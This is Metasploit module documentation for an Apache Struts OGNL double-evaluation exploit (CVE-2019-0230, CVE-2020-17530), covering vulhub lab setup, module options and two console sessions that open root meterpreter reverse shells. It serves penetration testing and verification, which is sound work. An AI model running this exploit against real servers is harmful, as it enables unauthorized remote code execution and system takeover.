## Vulnerable Application
The Apache Struts framework, when forced, performs double evaluation of attributes' values assigned to certain tags
attributes such as `id`. It is therefore possible to pass in a value to Struts that will be evaluated again
when a tag's attributes are rendered. With a carefully crafted request, this can lead to Remote Code Execution (RCE).

This vulnerability is application dependent. A server side template must make an affected use of request data to
render an HTML tag attribute.

Vulnerable versions of Apache Struts for both CVEs are provided by [vulhub][1] on GitHub. The setup instructions are identical
for both CVEs, just use the provided files in the correct directory.

1. Use `git` to clone `https://github.com/vulhub/vulhub.git`.
1. Change the current working directory to the one corresponding to the CVE that should be tested. For CVE-2019-0230, use
  `struts2/s2-059` and for CVE-2020-17530, use `struts2/s2-061`.
1. From within the directory, run `docker-compose up -d`
1. (OPTIONAL) Run `docker-compose exec struts2 bash` to obtain an interactive shell within the container. This is useful
  for debugging purposes.

* CVE-2019-0230 was patched in 2.5.20
* CVE-2020-17530 was patched in 2.5.26

### Example Setting Up CVE-2020-17530 / S2-061

```
[smcintyre@localhost ~]$ git clone https://github.com/vulhub/vulhub.git
Cloning into 'vulhub'...
remote: Enumerating objects: 234, done.
remote: Counting objects: 100% (234/234), done.
remote: Compressing objects: 100% (141/141), done.
remote: Total 10171 (delta 86), reused 191 (delta 69), pack-reused 9937
Receiving objects: 100% (10171/10171), 130.98 MiB | 8.36 MiB/s, done.
Resolving deltas: 100% (4014/4014), done.
[smcintyre@localhost ~]$ cd vulhub/struts2/s2-061
[smcintyre@localhost s2-061]$ docker-compose up -d
Creating network "s2-061_default" with the default driver
Pulling struts2 (vulhub/struts2:2.5.25)...
2.5.25: Pulling from vulhub/struts2
756975cb9c7e: Pull complete
d77915b4e630: Pull complete
5f37a0a41b6b: Pull complete
96b2c1e36db5: Pull complete
27a2d52b526e: Pull complete
93a36defce60: Pull complete
9e2014d79b30: Pull complete
ac71d4ce2ce4: Pull complete
a2f817e4badf: Pull complete
62ac51b7362f: Pull complete
e12f6705ebbe: Pull complete
4f4fb700ef54: Pull complete
97ba98138d72: Pull complete
Digest: sha256:eaf49b95f2c178cca77d3c8454f79a4fe4ed4dd9d342c9e9a911e842565217d2
Status: Downloaded newer image for vulhub/struts2:2.5.25
Creating s2-061_struts2_1 ... done
[smcintyre@localhost s2-061]$ docker-compose exec struts2 bash
root@d37b5ab61b87:/usr/src#
```

## Verification Steps

1. Install the vulnerable application, see the "Vulnerable Application" section.
1. Start `msfconsole`
1. Do: `use exploit/multi/http/struts2_multi_eval_ognl`
1. Set `RHOSTS` to the address of the target(s) to exploit.
1. Set `CVE` to the ID of the CVE you wish to run against the target: either `CVE-2020-17530` or `CVE-2019-0230`.
1. Do: `run`

## Options

### NAME
The HTTP query parameter or form data name. This option is closely related to the vulnerability and will likely be
application specific in real world environments. This must be the name of a parameter sent through either a GET or POST
request to the application that is reflected back as an HTML attribute. The module's `check` method will utilize this
value to determine if it can be used to evaluate OGNL expressions.

### CVE
The CVE to try exploit on `RHOSTS`, either `CVE-2020-17530` or `CVE-2019-0230`.

### TARGETURI
The base path to a valid Struts application on the target machine or machines.

### CMDSTAGER::DELAY
Delay between command executions. Set this value higher if the target tends to be slow to respond.

### HttpCookie
An optional cookie to include when making the HTTP request.

## Scenarios

### CVE-2020-17530 From Vulhub

```
msf6 > use exploit/multi/http/struts2_multi_eval_ognl
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set TARGET Linux\ Dropper
TARGET => Linux Dropper
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/struts2_multi_eval_ognl) > check
[*] 192.168.159.128:8080 - The target appears to be vulnerable.
msf6 exploit(multi/http/struts2_multi_eval_ognl) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp using CVE-2020-17530
[*] Command Stager progress -  44.15% done (362/820 bytes)
[*] Sending stage (3008420 bytes) to 172.18.0.2
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 172.18.0.2:46770) at 2020-12-15 19:43:28 -0500
[*] Command Stager progress - 100.00% done (820/820 bytes)

meterpreter > getuid
Server username: root @ d37b5ab61b87 (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : 172.18.0.2
OS           : Debian 10.6 (Linux 5.9.11-100.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### CVE-2019-0230 From Vulhub

```
msf6 > use exploit/multi/http/struts2_multi_eval_ognl
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set CVE CVE-2019-0230
CVE => CVE-2019-0230
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set TARGET Linux\ Dropper
TARGET => Linux Dropper
msf6 exploit(multi/http/struts2_multi_eval_ognl) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/struts2_multi_eval_ognl) > check
[*] 192.168.159.128:8080 - The target appears to be vulnerable.
msf6 exploit(multi/http/struts2_multi_eval_ognl) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp using CVE-2019-0230
[*] Command Stager progress -  44.15% done (362/820 bytes)
[*] Sending stage (3008420 bytes) to 172.19.0.2
[*] Command Stager progress - 100.00% done (820/820 bytes)
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 172.19.0.2:47884) at 2020-12-15 19:47:10 -0500

meterpreter > getuid
Server username: root @ 91f7855f1eda (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : 172.19.0.2
OS           : Debian 10.5 (Linux 5.9.11-100.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

[1]: https://github.com/vulhub/vulhub
